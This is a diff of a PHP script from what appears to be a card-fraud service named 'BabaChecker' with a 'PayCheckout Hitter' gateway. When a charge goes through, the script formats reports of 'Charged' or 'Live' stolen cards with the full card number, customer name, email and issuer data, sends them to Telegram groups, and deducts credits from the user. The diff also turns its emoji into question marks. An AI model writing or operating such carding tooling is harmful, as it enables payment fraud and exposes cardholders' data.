@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 declare(strict_types=1);
 require_once __DIR__ . '/../../app/Bootstrap.php';
 require_once __DIR__ . '/../../app/Db.php';
@@ -234,42 +234,39 @@ if (stripos($response, '"status":"Success"') !== false) {
     $newCredits = updateCredits($pdo, $uid, 5, $currentCredits, false, true);
     $fullResult =
         "<b>#PayCheckoutHitter</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Charged 🔥\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> PayCheckout Hitter\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Customer Name ➜</b> {$paymentDetails['name']}\n" .
-        "[ﾒ] <b>Customer Email ➜</b> {$paymentDetails['email']}\n" .
-        "[ﾒ] <b>Site ➜</b> {$paymentDetails['site']}\n" .
-        "[ﾒ] <b>Price ➜</b> {$paymentDetails['price']}\n" .
-        "[ﾒ] <b>Product ➜</b> {$paymentDetails['productName']}\n" .
-        "[ﾒ] <b>Quantity ➜</b> {$paymentDetails['productQuantity']}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
-        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Charged ??\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> PayCheckout Hitter\n" .
+        "???????????\n" .
+        "[?] <b>Customer Name ?</b> {$paymentDetails['name']}\n" .
+        "[?] <b>Customer Email ?</b> {$paymentDetails['email']}\n" .
+        "[?] <b>Site ?</b> {$paymentDetails['site']}\n" .
+        "[?] <b>Price ?</b> {$paymentDetails['price']}\n" .
+        "[?] <b>Product ?</b> {$paymentDetails['productName']}\n" .
+        "[?] <b>Quantity ?</b> {$paymentDetails['productQuantity']}\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
+        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
     sendTelegramMessage($botToken, '-1002890276135', $fullResult);
     $publicMessage =
-        "<b>Hit Detected ✅</b>\n" .
-        "━━━━━━━━\n" .
-        "<b>User ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "<b>Status ➜</b> <b>Charged 🔥</b>\n" .
-        "<b>Response ➜</b> {$err}\n" .
-        "<b>Gateway ➜</b> PayCheckout Hitter\n" .
-        "━━━━━━━━\n" .
-<<<<<<< HEAD
-        "<b>Hit From ➜</b> <a href=\"https://ethnix.net\">BabaChecker</a>";
-=======
-        "<b>Hit From ➜</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+        "<b>Hit Detected ?</b>\n" .
+        "????????\n" .
+        "<b>User ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "<b>Status ?</b> <b>Charged ??</b>\n" .
+        "<b>Response ?</b> {$err}\n" .
+        "<b>Gateway ?</b> PayCheckout Hitter\n" .
+        "????????\n" .
+        "<b>Hit From ?</b> <a href=\"https://babachecker.com\">BabaChecker</a>";
+
     sendTelegramMessage($botToken, '-1002552641928', $publicMessage);
     echo json_encode([
         'status' => 'charge',
@@ -295,23 +292,23 @@ if (stripos($response, '"status":"Success"') !== false) {
     $newCredits = updateCredits($pdo, $uid, 3, $currentCredits, true, false);
     $fullResult =
         "<b>#PayCheckoutHitter</b>\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Card ➜</b> <code>{$cc1}</code>\n" .
-        "[ﾒ] <b>Status ➜</b> Live ✅\n" .
-        "[ﾒ] <b>Response ➜</b> {$err}\n" .
-        "[ﾒ] <b>Gateway ➜</b> PayCheckout Hitter\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Site ➜</b> {$paymentDetails['site']}\n" .
-        "[ﾒ] <b>Price ➜</b> {$paymentDetails['price']}\n" .
-        "[ﾒ] <b>Product ➜</b> {$paymentDetails['productName']}\n" .
-        "[ﾒ] <b>Quantity ➜</b> {$paymentDetails['productQuantity']}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Info ➜</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
-        "[ﾒ] <b>Bank ➜</b> {$binInfo['issuer']}\n" .
-        "[ﾒ] <b>Country ➜</b> {$binInfo['country_info']}\n" .
-        "━━━━━━━━━━━\n" .
-        "[ﾒ] <b>Checked By ➜</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
-        "[ㇺ] <b>Dev ➜</b> babachecker";
+        "???????????\n" .
+        "[?] <b>Card ?</b> <code>{$cc1}</code>\n" .
+        "[?] <b>Status ?</b> Live ?\n" .
+        "[?] <b>Response ?</b> {$err}\n" .
+        "[?] <b>Gateway ?</b> PayCheckout Hitter\n" .
+        "???????????\n" .
+        "[?] <b>Site ?</b> {$paymentDetails['site']}\n" .
+        "[?] <b>Price ?</b> {$paymentDetails['price']}\n" .
+        "[?] <b>Product ?</b> {$paymentDetails['productName']}\n" .
+        "[?] <b>Quantity ?</b> {$paymentDetails['productQuantity']}\n" .
+        "???????????\n" .
+        "[?] <b>Info ?</b> {$binInfo['brand']} - {$binInfo['card_type']} - {$binInfo['level']}\n" .
+        "[?] <b>Bank ?</b> {$binInfo['issuer']}\n" .
+        "[?] <b>Country ?</b> {$binInfo['country_info']}\n" .
+        "???????????\n" .
+        "[?] <b>Checked By ?</b> " . htmlspecialchars($userFullName) . " [" . htmlspecialchars($userStatus) . "]\n" .
+        "[?] <b>Dev ?</b> babachecker";
     if (!empty($telegramId)) {
         sendTelegramMessage($botToken, $telegramId, $fullResult);
     }
@@ -358,8 +355,5 @@ if (stripos($response, '"status":"Success"') !== false) {
     ]);
     exit;
 }
-<<<<<<< HEAD
 ?>
-=======
-?>
->>>>>>> f0e10c4ddeefca130962ae1ec2a89d1fe968e85b
+
